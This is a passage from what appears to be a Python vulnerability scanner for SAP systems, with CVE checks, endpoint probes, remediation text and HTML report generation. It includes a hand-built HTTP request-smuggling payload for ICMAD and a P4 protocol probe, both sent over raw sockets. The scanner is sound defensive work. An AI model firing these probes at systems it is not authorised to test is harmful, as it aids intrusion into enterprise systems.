    if major != 7 or minor != 1:
        return None

    vulnerable = False
    if sp < 16:
        vulnerable = True
    elif sp in _MDM_CVE_2021_21475_FIXES:
        if patch < _MDM_CVE_2021_21475_FIXES[sp]:
            vulnerable = True
    # sp > 21 is considered patched

    if not vulnerable:
        return None

    return Finding(
        name="CVE-2021-21475 - SAP MDM Missing Authorization",
        severity=Severity.HIGH,
        description=(
            "SAP Master Data Management server version %s is vulnerable to "
            "CVE-2021-21475 (missing authorization check). An attacker can "
            "exploit this to access or modify sensitive master data without "
            "proper authorization." % mdm_version_str
        ),
        remediation=(
            "Apply SAP Security Note 3017908. Upgrade to at least: "
            "SP16 patch 17, SP17 patch 14, SP18 patch 16, SP19 patch 8, "
            "SP20 patch 5, or SP21 patch 0."
        ),
        detail="Detected: %s" % mdm_version_str,
        port=59950,
    )


# Minimum fixed versions for CVE-2021-21482 per SP level (SAP Note 3017908).
# Versions below these thresholds are vulnerable.
_MDM_CVE_2021_21482_FIXES = {
    20: 8,
    21: 0,
}


def check_cve_2021_21482(mdm_version_str):
    """Check for CVE-2021-21482 (SAP MDM information disclosure).

    Parses the MDM version string (e.g. "Version 7.1 (7.1.20.5 Win64)")
    and checks whether the SP/patch level is below the fix threshold.
    Returns a Finding if vulnerable, else None.
    """
    if not mdm_version_str:
        return None

    m = re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', mdm_version_str)
    if not m:
        return None

    major, minor, sp, patch = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))

    if major != 7 or minor != 1:
        return None

    vulnerable = False
    if sp < 20:
        vulnerable = True
    elif sp in _MDM_CVE_2021_21482_FIXES:
        if patch < _MDM_CVE_2021_21482_FIXES[sp]:
            vulnerable = True
    # sp > 21 is considered patched

    if not vulnerable:
        return None

    return Finding(
        name="CVE-2021-21482 - SAP MDM Information Disclosure",
        severity=Severity.MEDIUM,
        description=(
            "SAP Master Data Management server version %s is vulnerable to "
            "CVE-2021-21482 (information disclosure). An attacker can obtain "
            "sensitive information from the MDM server without proper "
            "authorization (SAP Note 3017908)." % mdm_version_str
        ),
        remediation=(
            "Apply SAP Security Note 3017908. Upgrade to at least: "
            "SP20 patch 8, or SP21 patch 0."
        ),
        detail="Detected: %s" % mdm_version_str,
        port=59950,
    )


def check_cve_2022_22536(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2022-22536 (ICMAD - HTTP Request Smuggling).

    Based on the Onapsis ICMAD scanner methodology. Sends a padded HTTP
    request to detect memory pipe desynchronization in vulnerable SAP ICM.
    Detection is safe and non-destructive (no data exfiltration or RCE).
    """
    finding = None

    # Step 1: Validate target serves SAP content (confirms it's an SAP ICM)
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    sap_resource = None
    working_ssl = None

    test_paths = [
        "/sap/admin/public/default.html?aaa",
        "/sap/public/bc/ur/Login/assets/corbu/sap_logo.png",
    ]

    for scheme in schemes:
        for path in test_paths:
            try:
                r = requests.get(
                    "%s://%s:%d%s" % (scheme, host, port, path),
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=False,
                )
                if r.status_code == 200:
                    sap_resource = path
                    working_ssl = (scheme == "https")
                    break
            except RequestException:
                continue
        if sap_resource:
            break

    if not sap_resource:
        return None

    # Step 2: Send smuggling probe via raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout + 3)
        sock.connect((host, port))

        if working_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        host_hdr = "%s:%d" % (host, port)
        padding = b"A" * 82642

        # Main request with oversized Content-Length
        main_req = (
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Length: 82646\r\n"
            "Connection: keep-alive\r\n"
            "\r\n" % (sap_resource, host_hdr)
        ).encode()

        # Smuggled second request appended after padding + CRLF separators
        smuggled = (
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "\r\n" % (sap_resource, host_hdr)
        ).encode()

        payload = main_req + padding + b"\r\n\r\n" + smuggled
        sock.sendall(payload)

        # Read response (may contain multiple HTTP responses if vulnerable)
        response = b""
        try:
            while len(response) < 65536:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()

        # Count HTTP response status lines
        status_matches = re.findall(rb'HTTP/\S+ (\d{3}) ', response)

        if len(status_matches) > 1:
            second_status = int(status_matches[1])
            if second_status == 400 or (500 <= second_status < 600):
                finding = Finding(
                    name="CVE-2022-22536 - ICMAD (HTTP Request Smuggling)",
                    severity=Severity.CRITICAL,
                    description=(
                        "The SAP Internet Communication Manager (ICM) on port %d "
                        "is vulnerable to HTTP request smuggling via memory pipe "
                        "desynchronization (CVSS 10.0). An unauthenticated attacker "
                        "can exploit this to hijack sessions, poison web caches, or "
                        "achieve full system compromise with a single HTTP request. "
                        "Also covers CVE-2022-22532 (ICM HTTP smuggling, CVSS 8.1)."
                        % port
                    ),
                    remediation=(
                        "Apply SAP Security Notes 3123396 and 3123427 immediately. "
                        "This affects SAP NetWeaver AS ABAP, AS Java, Content Server, "
                        "and Web Dispatcher."
                    ),
                    detail="Smuggling probe: %d HTTP responses (status codes: %s)" % (
                        len(status_matches),
                        ", ".join(m.decode() for m in status_matches)),
                    port=port,
                )
    except (socket.error, ssl.SSLError, OSError):
        pass

    return finding


def check_cve_2020_6207(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2020-6207 (SAP Solution Manager EEM Missing Auth).

    The EemAdminService endpoint allows unauthenticated access to execute
    commands on connected SMD agents when exposed without authentication.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/EemAdminService/EemAdmin" % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code in (200, 500):
                body = r.text.lower()
                # Filter out generic SAPControl responses
                if "sapcontrol" in body and "eem" not in body:
                    break
                finding = Finding(
                    name="CVE-2020-6207 - Solution Manager EEM Missing Authentication",
                    severity=Severity.CRITICAL,
                    description=(
                        "The /EemAdminService/EemAdmin endpoint on port %d is "
                        "accessible without authentication (HTTP %d). This allows "
                        "unauthenticated remote code execution on connected SMD "
                        "agents via the Solution Manager EEM service (CVSS 10.0)."
                        % (port, r.status_code)
                    ),
                    remediation=(
                        "Apply SAP Security Note 2890213 immediately. Restrict "
                        "network access to Solution Manager and disable the EEM "
                        "service if not required."
                    ),
                    detail="GET %s://.../EemAdminService/EemAdmin returned HTTP %d"
                           % (scheme, r.status_code),
                    port=port,
                )
                break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


def check_cve_2010_5326(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2010-5326 (SAP Invoker Servlet - unauthenticated RCE).

    The Invoker Servlet on older SAP NetWeaver AS Java (before 7.3) does
    not require authentication. We check for the /servlet/ path returning
    a non-404 response, indicating the Invoker Servlet is enabled.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/servlet/com.sap.ctc.util.ConfigServlet"
                % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200:
                body = r.text.lower()
                if "sapcontrol" in body or "wsdl" in body:
                    break
                finding = Finding(
                    name="CVE-2010-5326 - Invoker Servlet Unauthenticated Access",
                    severity=Severity.CRITICAL,
                    description=(
                        "The Invoker Servlet on port %d is accessible without "
                        "authentication (HTTP 200). This allows unauthenticated "
                        "remote code execution on SAP NetWeaver AS Java systems "
                        "prior to version 7.3 (CVSS 10.0). This vulnerability is "
                        "known to have been actively exploited in the wild." % port
                    ),
                    remediation=(
                        "Apply SAP Security Note 1445998. Disable the Invoker "
                        "Servlet and restrict access to /servlet/* paths."
                    ),
                    detail="GET %s://.../servlet/com.sap.ctc.util.ConfigServlet "
                           "returned HTTP 200" % scheme,
                    port=port,
                )
                break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


def check_cve_2021_33690(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2021-33690 (SAP NWDI Component Build Service SSRF).

    The CBS servlet endpoint being accessible indicates SAP NetWeaver
    Development Infrastructure is exposed and potentially vulnerable
    to SSRF (CVSS 9.9).
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/tc.CBS.Appl/tcspseudo" % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code in (200, 405, 500):
                body = r.text.lower()
                if "sapcontrol" in body or "wsdl" in body:
                    break
                finding = Finding(
                    name="CVE-2021-33690 - NWDI Component Build Service SSRF",
                    severity=Severity.CRITICAL,
                    description=(
                        "The /tc.CBS.Appl/tcspseudo endpoint on port %d is "
                        "accessible (HTTP %d). This indicates SAP NetWeaver "
                        "Development Infrastructure Component Build Service is "
                        "exposed and may be vulnerable to SSRF allowing internal "
                        "network access (CVSS 9.9)." % (port, r.status_code)
                    ),
                    remediation=(
                        "Apply SAP Security Note 3075546. Restrict network access "
                        "to NWDI components and disable CBS if not required."
                    ),
                    detail="GET %s://.../tc.CBS.Appl/tcspseudo returned HTTP %d"
                           % (scheme, r.status_code),
                    port=port,
                )
                break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


def check_cve_2020_6308(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2020-6308 (SAP BusinessObjects SSRF).

    The querybuilder logon endpoint being accessible without auth indicates
    potential SSRF via CMS parameter injection.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/AdminTools/querybuilder/logon"
                % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200:
                body = r.text.lower()
                if "sapcontrol" in body or "wsdl" in body:
                    break
                finding = Finding(
                    name="CVE-2020-6308 - BusinessObjects SSRF",
                    severity=Severity.MEDIUM,
                    description=(
                        "The /AdminTools/querybuilder/logon endpoint on port %d "
                        "is accessible (HTTP 200). SAP BusinessObjects BI Platform "
                        "may be vulnerable to unauthenticated Server-Side Request "
                        "Forgery via CMS parameter injection (CVSS 5.3)." % port
                    ),
                    remediation=(
                        "Apply SAP Security Note 2943844. Restrict access to "
                        "/AdminTools/* paths."
                    ),
                    detail="GET %s://.../AdminTools/querybuilder/logon returned "
                           "HTTP 200" % scheme,
                    port=port,
                )
                break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


# ---------------------------------------------------------------------------
# SAP BusinessObjects vulnerability checks
# ---------------------------------------------------------------------------

def check_bo_cmc_exposed(host, port, use_ssl=False, timeout=5):
    """Check if SAP BusinessObjects CMC admin console is accessible.

    The Central Management Console should only be accessible from
    administrative IP addresses, not from the general network.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/BOE/CMC/" % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code == 200:
                body = r.text.lower()
                if any(kw in body for kw in (
                    "businessobjects", "boe", "central management",
                    "logon", "cms", "sap")):
                    finding = Finding(
                        name="SAP BusinessObjects CMC Admin Console Exposed",
                        severity=Severity.LOW,
                        description=(
                            "The SAP BusinessObjects Central Management Console "
                            "(CMC) on port %d is accessible from the network. The "
                            "CMC provides full administrative control over the BI "
                            "platform including user management, server "
                            "configuration, and content administration." % port
                        ),
                        remediation=(
                            "Restrict access to /BOE/CMC/ to administrative IP "
                            "addresses only using firewall rules, reverse proxy "
                            "ACLs, or SAP Web Application Server configuration. "
                            "The CMC should not be exposed to general users or "
                            "untrusted networks."
                        ),
                        detail="GET %s://.../BOE/CMC/ returned HTTP 200 (admin "
                               "console accessible)" % scheme,
                        port=port,
                    )
                    break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


def check_cve_2024_41730(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2024-41730 (SAP BO SSO Token Theft via REST API).

    If the biprws REST API is accessible, attackers can potentially
    obtain logon tokens via the /biprws/logon/trusted endpoint when
    SSO Enterprise authentication is enabled (CVSS 9.8).

    Safe detection: only checks if the REST API endpoint exists, does
    NOT attempt actual token theft.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/biprws/logon/long" % (scheme, host, port),
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "application/xml",
                },
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code == 200:
                body = r.text.lower()
                if any(kw in body for kw in (
                    "logontoken", "biprws", "attrs", "logon",
                    "businessobjects", "enterprise")):
                    finding = Finding(
                        name="CVE-2024-41730 - BusinessObjects SSO Token Theft "
                             "(REST API Exposed)",
                        severity=Severity.CRITICAL,
                        description=(
                            "The SAP BusinessObjects REST API (/biprws/) on port "
                            "%d is accessible without authentication. If Single "
                            "Sign-On (SSO) Enterprise authentication is enabled, "
                            "an attacker can exploit the /biprws/logon/trusted "
                            "endpoint with a crafted X-SAP-TRUSTED-USER header to "
                            "obtain a logon token and fully compromise the system "
                            "(CVSS 9.8). This also enables CVE-2026-0490 (auth "
                            "bypass and user lockout)." % port
                        ),
                        remediation=(
                            "Apply SAP Security Note 3479478 immediately. Restrict "
                            "network access to /biprws/* paths. If SSO is not "
                            "required, disable Enterprise SSO authentication."
                        ),
                        detail="GET %s://.../biprws/logon/long returned HTTP 200 "
                               "(REST API accessible)" % scheme,
                        port=port,
                    )
                    break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


def check_cve_2025_0061(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2025-0061 (SAP BO Session Hijacking).

    An information disclosure vulnerability allows unauthenticated
    attackers to hijack user sessions without interaction. Detection
    checks for exposed BI Launch Pad which is the attack surface.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.get(
                "%s://%s:%d/BOE/BI" % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code == 200:
                body = r.text.lower()
                if any(kw in body for kw in (
                    "bi launch", "businessobjects", "logon",
                    "boe", "sap", "launchpad")):
                    finding = Finding(
                        name="CVE-2025-0061 - BusinessObjects Session Hijacking",
                        severity=Severity.HIGH,
                        description=(
                            "The SAP BusinessObjects BI Launch Pad on port %d is "
                            "accessible. An information disclosure vulnerability "
                            "(CVE-2025-0061, CVSS 8.7) allows unauthenticated "
                            "attackers to hijack user sessions over the network "
                            "without any user interaction, gaining full read/modify "
                            "access to application data. Also exposes the system to "
                            "CVE-2025-23192 (stored XSS in BI Workspace, stealing "
                            "session data)." % port
                        ),
                        remediation=(
                            "Apply SAP Security Note 3474398 immediately. Restrict "
                            "network access to /BOE/BI to authorized users only. "
                            "Implement WAF rules to detect session hijacking "
                            "attempts."
                        ),
                        detail="GET %s://.../BOE/BI returned HTTP 200 "
                               "(BI Launch Pad accessible)" % scheme,
                        port=port,
                    )
                    break
            elif r.status_code in (401, 403, 404):
                break
        except RequestException:
            continue
    return finding


def check_bo_cms_network_exposed(host, port, timeout=5):
    """Check if BusinessObjects CMS port is accessible from network.

    The CMS port (default 6400) being accessible from untrusted networks
    enables CVE-2026-0485 (CMS DoS via crafted requests causing repeated
    crashes) and CVE-2026-0490 (authentication bypass via crafted requests
    locking out legitimate users).
    """
    finding = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.close()
        finding = Finding(
            name="SAP BusinessObjects CMS Port Exposed "
                 "(CVE-2026-0485 / CVE-2026-0490)",
            severity=Severity.MEDIUM,
            description=(
                "The SAP BusinessObjects Content Management Server (CMS) on "
                "port %d is accessible from the network. This exposes the "
                "system to CVE-2026-0485 (unauthenticated attackers can send "
                "crafted requests to crash the CMS repeatedly, causing "
                "persistent service disruptions) and CVE-2026-0490 "
                "(authentication bypass locking out legitimate users)." % port
            ),
            remediation=(
                "Apply the latest SAP Security Notes for BusinessObjects. "
                "Restrict access to the CMS port (%d) to only authorized "
                "application servers and administrative hosts using firewall "
                "rules. The CMS port should never be exposed to untrusted "
                "networks." % port
            ),
            detail="TCP connect to %s:%d succeeded (CMS port accessible)"
                   % (host, port),
            port=port,
        )
    except (socket.error, OSError):
        pass
    return finding


def check_cve_2022_41272(host, port, timeout=5):
    """Check for CVE-2022-41272 by probing the SAP P4 service.

    CVE-2022-41272 (CVSS 9.9) is an improper access control vulnerability in
    SAP NetWeaver Process Integration (PI/PO). The P4 protocol on port 5NN04
    exposes remote functions (JMS Connector Service) that can be called without
    authentication, allowing unauthenticated attackers to access or modify
    sensitive data.

    Detection: send the nmap-sap P4 probe and check if the service responds
    with the P4 protocol signature ("v1").
    """
    # nmap-sap SAPP4 probe: q|v1\x18#p#4None:127.0.0.1:33170|
    p4_probe = b"v1\x18#p#4None:127.0.0.1:33170"
    finding = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(p4_probe)
        resp = b""
        try:
            while len(resp) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        sock.close()

        if resp and resp[:2] == b"v1":
            # P4 service confirmed - extract internal IP if present
            detail = "P4 service responded on %s:%d (%d bytes)" % (host, port, len(resp))
            m = re.search(rb"v1.*?:(\d+\.\d+\.\d+\.\d+)", resp)
            if m:
                internal_ip = m.group(1).decode()
                detail += ", internal IP: %s" % internal_ip

            finding = Finding(
                name="CVE-2022-41272: SAP P4 Service Exposed (Unauthenticated Access)",
                severity=Severity.CRITICAL,
                description=(
                    "The SAP P4 service on port %d is accessible without "
                    "authentication. CVE-2022-41272 (CVSS 9.9) allows "
                    "unauthenticated attackers to call remote functions in "
                    "the JMS Connector Service via the P4 protocol, enabling "
                    "access to and modification of sensitive data. This affects "
                    "SAP NetWeaver Process Integration (Java Stack)." % port
                ),
                remediation=(
                    "Apply SAP Security Note 3267780. Restrict network access "
                    "to P4 ports (5NN04) using firewall rules so that only "
                    "authorized application servers can reach them. Consider "
                    "disabling the P4 service if not required."
                ),
                detail=detail,
                port=port,
            )
    except (socket.error, OSError):
        pass
    return finding


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7: Report Generation
# ═══════════════════════════════════════════════════════════════════════════════

def generate_svg_topology(landscape):
    """Generate an SVG network topology diagram."""
    systems = landscape
    if not systems:
        return '<svg width="400" height="100"><text x="10" y="50" fill="#aaa">No systems found</text></svg>'

    box_w = 340
    margin_x = 40
    margin_y = 40
    cols = max(1, min(4, len(systems)))
    rows = (len(systems) + cols - 1) // cols

    # Calculate box height based on max instances across systems
    max_insts = max(len(s.instances) for s in systems)
    # Header(30) + instances label(20) + per-instance(16*N) + hostname/kernel(40) + padding(10)
    box_h = 30 + 20 + max(max_insts, 1) * 16 + 40 + 10
    box_h = max(box_h, 160)

    svg_w = cols * (box_w + margin_x) + margin_x
    svg_h = rows * (box_h + margin_y) + margin_y + 60

    lines = []
    lines.append('<svg xmlns="http://www.w3.org/2000/svg" width="%d" height="%d" '
                 'viewBox="0 0 %d %d">' % (svg_w, svg_h, svg_w, svg_h))
    lines.append('<rect width="100%%" height="100%%" fill="#1a1a2e" rx="8"/>')
    lines.append('<text x="%d" y="30" fill="#e0e0e0" font-size="16" '
                 'font-family="monospace" text-anchor="middle">SAP Network Topology</text>'
                 % (svg_w // 2))

    positions = {}
    for idx, sys_obj in enumerate(systems):
        row = idx // cols
        col = idx % cols
        x = margin_x + col * (box_w + margin_x)
        y = 50 + row * (box_h + margin_y)
        positions[sys_obj.sid] = (x + box_w // 2, y + box_h // 2)

        sev = sys_obj.highest_severity()
        if sev is not None:
            color = SEVERITY_COLORS.get(sev, "#2ecc71")
        else:
            color = "#2ecc71"

        border_color = color
        fill = "#16213e"

        lines.append('<rect x="%d" y="%d" width="%d" height="%d" '
                     'rx="6" fill="%s" stroke="%s" stroke-width="2"/>'
                     % (x, y, box_w, box_h, fill, border_color))

        # SID header
        inst_nrs = sorted(set(i.instance_nr for i in sys_obj.instances if i.instance_nr != "XX"))
        header_parts = [sys_obj.sid]
        if sys_obj.system_type:
            header_parts.append(sys_obj.system_type)
        if inst_nrs:
            header_parts.append("[%s]" % ",".join(inst_nrs))
        header_text = "  ".join(header_parts)
        lines.append('<rect x="%d" y="%d" width="%d" height="30" '
                     'rx="6" fill="%s" opacity="0.3"/>'
                     % (x, y, box_w, color))
        lines.append('<text x="%d" y="%d" fill="white" font-size="14" '
                     'font-family="monospace" font-weight="bold" text-anchor="middle">%s</text>'
                     % (x + box_w // 2, y + 20, html.escape(header_text)))

        # Instance details with tooltips
        text_y = y + 50
        for inst in sys_obj.instances:
            # Build full (untruncated) label for tooltip
            all_ports = ",".join(str(p) for p in sorted(inst.ports.keys()))
            full_label = "Instance %s | %s | Ports: %s" % (inst.instance_nr, inst.ip, all_ports)
            # Add service info
            svc_names = sorted(inst.services.keys())
            if svc_names:
                full_label += " | Services: %s" % ", ".join(svc_names)
            inst_name = inst.info.get("sc_INSTANCE_NAME", "")
            if inst_name:
                full_label += " | %s" % inst_name

            # Short label for display
            short_ports = ",".join(str(p) for p in sorted(inst.ports.keys())[:6])
            label = "%s  %s  [%s]" % (inst.instance_nr, inst.ip, short_ports)
            if len(label) > 48:
                label = label[:45] + "..."

            # SVG <text> with <title> for hover tooltip
            lines.append('<text x="%d" y="%d" fill="#b0b0b0" font-size="10" '
                         'font-family="monospace" cursor="default">'
                         '<title>%s</title>%s</text>'
                         % (x + 10, text_y, html.escape(full_label), html.escape(label)))
            text_y += 16

        # Hostname / kernel
        if sys_obj.hostname:
            lines.append('<text x="%d" y="%d" fill="#7f8c8d" font-size="10" '
                         'font-family="monospace">Host: %s</text>'
                         % (x + 10, y + box_h - 30, html.escape(sys_obj.hostname)))
        if sys_obj.kernel:
            lines.append('<text x="%d" y="%d" fill="#7f8c8d" font-size="10" '
                         'font-family="monospace">Kernel: %s</text>'
                         % (x + 10, y + box_h - 14, html.escape(sys_obj.kernel)))

        # Finding count
        fc = len(sys_obj.all_findings())
        if fc > 0:
            lines.append('<circle cx="%d" cy="%d" r="12" fill="%s"/>'
                         % (x + box_w - 15, y + 15, color))
            lines.append('<text x="%d" y="%d" fill="white" font-size="11" '
                         'font-family="monospace" text-anchor="middle">%d</text>'
                         % (x + box_w - 15, y + 19, fc))

    # Draw relationship lines
    for sys_obj in systems:
        for rel in sys_obj.relationships:
            src_sid = sys_obj.sid
            dst_sid = rel.get("sid", "")
            if src_sid in positions and dst_sid in positions:
                x1, y1 = positions[src_sid]
                x2, y2 = positions[dst_sid]
                lines.append('<line x1="%d" y1="%d" x2="%d" y2="%d" '
                             'stroke="#5dade2" stroke-width="1" stroke-dasharray="5,5" '
                             'opacity="0.5"/>' % (x1, y1, x2, y2))

    lines.append('</svg>')
    return "\n".join(lines)


def generate_html_report(landscape, output_path, scan_duration=0, scan_params=None, btp_results=None):
    """Generate a self-contained HTML report."""
    total_findings = sum(len(s.all_findings()) for s in landscape)
    critical_count = sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.CRITICAL)
    high_count = sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.HIGH)
    medium_count = sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.MEDIUM)
    low_count = sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.LOW)
    info_count = sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.INFO)
    total_instances = sum(len(s.instances) for s in landscape)

    # Include BTP findings in executive summary counts
    if btp_results:
        for ep in btp_results.endpoints:
            for f in ep.findings:
                total_findings += 1
                if f.severity == Severity.CRITICAL:
                    critical_count += 1
                elif f.severity == Severity.HIGH:
                    high_count += 1
                elif f.severity == Severity.MEDIUM:
                    medium_count += 1
                elif f.severity == Severity.LOW:
                    low_count += 1
                elif f.severity == Severity.INFO:
                    info_count += 1
        total_instances += sum(1 for ep in btp_results.endpoints if ep.alive)

    svg_topology = generate_svg_topology(landscape)

    # Build findings table rows (on-prem + BTP combined)
    findings_rows = ""
    all_findings = []
    for sys_obj in landscape:
        for inst in sys_obj.instances:
            for f in inst.findings:
                system_label = "%s (%s:%s)" % (sys_obj.sid, inst.ip, f.port)
                all_findings.append((f, system_label))

    # Include BTP findings in the same table
    if btp_results:
        for ep in btp_results.endpoints:
            for f in ep.findings:
                system_label = "BTP: %s" % ep.hostname
                if ep.region:
                    system_label += " (%s)" % ep.region
                if f.port:
                    system_label += ":%s" % f.port
                all_findings.append((f, system_label))

    all_findings.sort(key=lambda x: x[0].severity)

    for f, system_label in all_findings:
        sev_color = SEVERITY_COLORS[f.severity]
        sev_name = SEVERITY_NAMES[f.severity]
        findings_rows += """
        <tr>
          <td><span class="severity-badge" style="background:%s">%s</span></td>
          <td>%s</td>
          <td>%s</td>
          <td>%s</td>
          <td class="detail-cell">%s</td>
          <td>%s</td>
        </tr>
        """ % (
            sev_color, sev_name,
            html.escape(f.name),
            html.escape(system_label),
            html.escape(f.description),
            html.escape(f.detail),
            html.escape(f.remediation),
        )

    # Build system detail sections
    system_details = ""
    for sys_obj in landscape:
        sev = sys_obj.highest_severity()
        border_color = SEVERITY_COLORS.get(sev, "#2ecc71") if sev is not None else "#2ecc71"

        inst_rows = ""
        for inst in sys_obj.instances:
            ports_str = ", ".join("%d (%s)" % (p, d) for p, d in sorted(inst.ports.items()))
            info_str = "<br>".join("%s: %s" % (html.escape(k), html.escape(str(v)[:100]))
                                   for k, v in sorted(inst.info.items()) if k != "raw" and k != "accessible")
            finding_count = len(inst.findings)
            inst_rows += """
            <tr>
              <td>%s</td><td>%s</td><td>%s</td>
              <td class="detail-cell">%s</td>
              <td class="detail-cell">%s</td>
              <td>%d</td>
            </tr>
            """ % (
                html.escape(inst.instance_nr),
                html.escape(inst.ip),
                html.escape(inst.host),
                ports_str,
                info_str,
                finding_count,
            )

        system_details += """
        <div class="system-card" style="border-left: 4px solid %s">
          <h3>%s %s</h3>
          <p class="system-meta">Hostname: %s | Kernel: %s | Instances: %d</p>
          <table>
            <thead>
              <tr><th>Instance</th><th>IP</th><th>Host</th><th>Open Ports</th><th>Info</th><th>Findings</th></tr>
            </thead>
            <tbody>%s</tbody>
          </table>
        </div>
        """ % (
            border_color,
            html.escape(sys_obj.sid),
            ("(%s)" % html.escape(sys_obj.hostname)) if sys_obj.hostname else "",
            html.escape(sys_obj.hostname or "N/A"),
            html.escape(sys_obj.kernel or "N/A"),
            len(sys_obj.instances),
            inst_rows,
        )

    # Build URL scan results section
    url_scan_section = ""
    has_url_results = any(
        inst.url_scan_results
        for sys_obj in landscape
        for inst in sys_obj.instances
    )
    if has_url_results:
        url_scan_rows = ""
        for sys_obj in landscape:
            for inst in sys_obj.instances:
                if not inst.url_scan_results:
                    continue
                for r in inst.url_scan_results:
                    sc = r["status_code"]
                    if sc == 200:
                        status_color = "#2ecc71"
                        status_label = "Accessible"
                    elif sc == 401:
                        status_color = "#e67e22"
                        status_label = "Auth Required"
                    elif sc == 403:
                        status_color = "#e74c3c"
                        status_label = "Forbidden"
                    elif sc in (301, 302, 303, 307, 308):
                        status_color = "#3498db"
                        status_label = "Redirect"
                    elif sc >= 500:
                        status_color = "#9b59b6"
                        status_label = "Server Error"
                    else:
                        status_color = "#95a5a6"
                        status_label = str(sc)

                    tamper_badge = ""
                    if r.get("verb_tamper"):
                        tamper_badge = (' <span class="severity-badge" '
                                        'style="background:#e67e22;font-size:10px">'
                                        'VERB TAMPER</span>')

                    redirect_info = ""
                    if r.get("redirect"):
                        redirect_info = " &rarr; %s" % html.escape(r["redirect"])

                    scheme = "https" if r.get("scan_ssl") else "http"
                    scan_port_nr = r.get("scan_port", 0)
                    full_url = "%s://%s:%d%s" % (
                        scheme, inst.ip, scan_port_nr,
                        r["path"] if r["path"].startswith("/") else "/" + r["path"])

                    url_scan_rows += """
                    <tr>
                      <td>%s</td>
                      <td>%s:%d</td>
                      <td><span style="color:%s;font-weight:bold">%d</span> %s</td>
                      <td><a href="%s" target="_blank" style="color:var(--accent);text-decoration:none"
                             onmouseover="this.style.textDecoration='underline'"
                             onmouseout="this.style.textDecoration='none'">%s</a>%s</td>
                      <td>%d</td>
                      <td>%s</td>
                    </tr>
                    """ % (
                        html.escape(sys_obj.sid),
                        html.escape(inst.ip), scan_port_nr,
                        status_color, sc, status_label,
                        html.escape(full_url),
                        html.escape(r["path"]), redirect_info,
                        r.get("content_length", 0),
                        tamper_badge,
                    )

        total_urls = sum(
            len(inst.url_scan_results)
            for sys_obj in landscape
            for inst in sys_obj.instances
        )
        url_scan_section = """
<h2>ICM URL Scan Results (%d URLs found)</h2>
<details class="collapsible-section">
  <summary>Click to expand / collapse URL scan results (%d entries)</summary>
  <table>
    <thead>
      <tr><th>System</th><th>Endpoint</th><th>Status</th><th>Path</th><th>Size</th><th>Notes</th></tr>
    </thead>
